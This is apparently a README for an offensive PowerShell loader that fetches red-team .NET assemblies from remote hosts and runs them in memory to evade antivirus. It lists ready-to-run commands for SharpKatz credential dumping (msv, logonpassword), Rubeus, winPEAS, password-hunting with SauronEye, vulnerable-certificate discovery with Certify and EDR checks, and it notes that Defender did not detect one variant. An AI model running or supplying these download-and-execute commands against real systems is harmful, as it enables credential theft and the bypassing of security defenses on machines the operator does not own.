# PowerShell exec-assembly remote loader

## This is used to load sharp assembly tools remotely from PowerShell direcly in memory (fileless) for a better AV bypass (need AMSI bypass first)

Usage:

```
## Load SharpKatz
Invoke-LoadAssembly -AssemblyUrl http://10.10.10.128:81/SharpKatz.exe -Command "msv"
Invoke-LoadAssembly -AssemblyUrl https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_x64/SharpKatz.exe?raw=true -Command "msv"
Invoke-LoadAssembly -AssemblyUrl https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_x64/SharpKatz.exe?raw=true -Command "logonpassword"

## Load winPEAS
Invoke-LoadAssembly -AssemblyUrl http://10.10.10.128:81/winPEAS.exe -Command "notcolor quiet log"
Invoke-LoadAssembly -AssemblyUrl https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/Dotfuscated/any/winPEASany.exe?raw=true -Command "notcolor quiet"

## Load Rubeus
Invoke-LoadAssembly -AssemblyUrl http://10.10.10.128:81/Rubeus.exe -Command "hash /password:test"
Invoke-LoadAssembly -AssemblyUrl https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Rubeus.exe?raw=true -Command "hash /password:test"
Invoke-LoadAssembly -AssemblyUrl https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_x64/Rubeus.exe?raw=true -Command "hash /password:test"

## Load SharpEDRChecker
Invoke-LoadAssembly -AssemblyUrl http://10.0.0.144:8000/SharpEDRChecker.exe -Command ""
Invoke-LoadAssembly -AssemblyUrl https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_x64/SharpEDRChecker.exe?raw=true

## Load SauronEye
Invoke-LoadAssembly -AssemblyUrl https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_x64/SauronEye.exe?raw=true -Command "--directories c:\ --filetypes .txt -contents --keywords password pass*"

## Load Certify
Invoke-LoadAssembly -AssemblyUrl https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Certify.exe?raw=true -Command "find /vulnerable"

## Load EDD
Invoke-LoadAssembly -AssemblyUrl https://github.com/F4l13n5n0w/PowerSharpLoader/blob/master/x64/EDD.exe?raw=true -Command "-h"
Invoke-LoadAssembly -AssemblyUrl https://github.com/F4l13n5n0w/PowerSharpLoader/blob/master/x64/EDD_any.exe?raw=true -Command "-h"


### After fix the reflectedType is not public issue (Defender not detected):
## Load SharpUp
Invoke-LoadAssembly -AssemblyUrl http://10.10.10.128:81/SharpUpNew.exe -Command "audit"
Invoke-LoadAssembly -AssemblyUrl https://github.com/F4l13n5n0w/PowerSharpLoader/blob/master/x64/SharpUp.exe?raw=true -Command "audit"

## Load Seatbelt
Invoke-LoadAssembly -AssemblyUrl https://github.com/F4l13n5n0w/PowerSharpLoader/blob/master/x64/Seatbelt.exe?raw=true -Command "-group=user -outputfile=C:\\Temp\\out.txt"
Invoke-LoadAssembly -AssemblyUrl https://github.com/F4l13n5n0w/PowerSharpLoader/blob/master/x64/Seatbelt.exe?raw=true -Command "-group=all -full -outputfile=C:\Temp\out.txt"

```